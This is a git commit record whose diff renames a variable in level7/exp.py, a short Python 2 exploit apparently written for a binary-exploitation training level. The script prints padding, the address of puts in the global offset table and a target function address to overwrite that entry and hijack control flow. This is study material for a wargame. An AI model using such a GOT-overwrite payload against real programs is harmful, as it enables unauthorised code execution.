bf169406cf414a555ea3a0a113f3f8d59e24e0f8
Abdechahid Ihya <aihya@e1r6p12.1337.ma>
2022-03-03 11:38:18 +0100

    level7/exp.py

--- level7/exp.py
+++ level7/exp.py
@@ -1,6 +1,6 @@
 import struct
 
-mok = struct.pack('I', 0x080484f4)
+m = struct.pack('I', 0x080484f4)
 puts_got = struct.pack('I', 0x8049928)
 
-print "A" * 20 + puts_got + " " +  mok
+print "A" * 20 + puts_got + " " +  m
